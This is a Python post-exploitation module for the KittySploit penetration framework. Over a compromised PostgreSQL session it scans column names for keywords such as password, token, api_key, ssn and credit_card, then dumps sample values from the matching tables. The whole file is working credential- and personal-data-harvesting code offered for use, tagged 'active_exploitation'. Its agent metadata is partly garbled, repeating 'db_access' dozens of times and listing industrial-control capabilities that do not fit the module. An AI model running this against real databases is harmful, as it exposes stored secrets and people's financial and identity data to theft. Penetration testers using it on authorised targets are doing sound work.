from kittysploit import *
from lib.protocols.postgresql.postgresql_client import PostgreSQLClient


class Module(Post, PostgreSQLClient):

	__info__ = {
		"name": "Search PostgreSQL Sensitive Data",
		"description": (
			"Find columns likely to hold secrets (password, token, api_key, etc.) "
			"and optionally dump a few sample rows"
		),
		"author": "KittySploit Team",
		"session_type": SessionType.POSTGRESQL,
	'agent': {
	    'risk': 'intrusive',
	    'effects': ['active_exploitation'],
	    'expected_requests': 2,
	    'reversible': False,
	    'approval_required': True,
	    'produces': ['risk_signals'],
	    'cost': 1.5,
	    'noise': 0.5,
	    'value': 1.0,
	    'requires': 	    {'min_endpoints': 0,
	     'min_params': 0,
	     'tech_hints_any': [],
	     'tech_hints_all': [],
	     'specializations_any': [],
	     'risk_signals_any': [],
	     'auth_session': False,
	     'capabilities_any': [],
	     'capabilities_all': [],
	     'confidence_min': {},
	     'confidence_min_any': {},
	     'endpoint_pattern_any': [],
	     'param_any': [],
	     'api_surface_ready': False},
	    'chain': 	    {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 's7comm', 'from_detail': ''},
	                               {'capability': 'ot_assets', 'from_detail': ''},
	                               {'capability': 'ot_assets', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''}],
	     'consumes_capabilities': [],
	     'option_bindings': {},
	     'suggested_followups': []},
	},
	}

	KEYWORDS = OptString(
		"password,passwd,secret,token,api_key,apikey,credential,private_key,ssn,credit_card",
		"Comma-separated column name keywords",
		False,
	)
	schema = OptString("", "Limit to schema (empty = all user schemas)", False)
	sample_rows = OptInteger(3, "Sample rows per matching column (0 = names only)", False)
	max_tables = OptInteger(25, "Max tables to sample", False)

	def run(self):
		try:
			keywords = [
				k.strip().lower()
				for k in str(self.KEYWORDS or "").split(",")
				if k.strip()
			]
			if not keywords:
				raise ProcedureError(
					FailureType.ConfigurationError, "At least one keyword is required"
				)

			schema_filter = str(self.schema).strip() if self.schema else ""
			limit = max(0, int(self.sample_rows) if self.sample_rows is not None else 0)
			max_tables = max(1, int(self.max_tables) if self.max_tables is not None else 25)

			print_status(f"Searching columns matching: {', '.join(keywords)}")
			matches = self._find_columns(keywords, schema_filter)
			if not matches:
				print_warning("No matching columns found")
				return True

			print_success(f"Found {len(matches)} matching column(s):")
			for schema_name, table_name, column_name, dtype in matches:
				print_info(f"  {schema_name}.{table_name}.{column_name} ({dtype})")

			if limit <= 0:
				return True

			print_info("-" * 80)
			print_status(f"Sampling up to {max_tables} table(s)")
			sampled = 0
			for schema_name, table_name, column_name, _dtype in matches:
				if sampled >= max_tables:
					break
				if not self._can_select(schema_name, table_name):
					print_warning(f"  Skip {schema_name}.{table_name} (no SELECT)")
					continue
				sampled += 1
				self._sample_column(schema_name, table_name, column_name, limit)

			return True
		except ProcedureError:
			raise
		except Exception as exc:
			raise ProcedureError(
				FailureType.Unknown, f"Sensitive data search failed: {exc}"
			)

	def _find_columns(self, keywords, schema_filter: str):
		conditions = " OR ".join(["LOWER(column_name) LIKE %s"] * len(keywords))
		params = [f"%{kw}%" for kw in keywords]
		query = (
			"SELECT table_schema, table_name, column_name, data_type "
			"FROM information_schema.columns "
			f"WHERE ({conditions}) "
			"AND table_schema NOT IN ('pg_catalog', 'information_schema') "
		)
		if schema_filter:
			query += "AND table_schema = %s "
			params.append(schema_filter)
		query += "ORDER BY table_schema, table_name, column_name;"
		return self.execute_query(query, tuple(params))

	def _can_select(self, schema: str, table: str) -> bool:
		try:
			rows = self.execute_query(
				"SELECT has_table_privilege(%s, 'SELECT');",
				(f"{schema}.{table}",),
				fetch_all=False,
			)
			return bool(rows and rows[0])
		except Exception:
			return False

	def _sample_column(self, schema: str, table: str, column: str, limit: int):
		quoted = f'"{schema}"."{table}"'
		col = f'"{column}"'
		try:
			rows = self.execute_query(
				f"SELECT {col} FROM {quoted} "
				f"WHERE {col} IS NOT NULL LIMIT %s;",
				(limit,),
			)
		except Exception as exc:
			print_warning(f"  {schema}.{table}.{column}: {exc}")
			return

		if not rows:
			print_info(f"  {schema}.{table}.{column}: (empty)")
			return

		print_info(f"  {schema}.{table}.{column} samples:")
		for row in rows:
			value = row[0]
			text = str(value)
			if len(text) > 120:
				text = text[:117] + "..."
			print_info(f"    {text}")
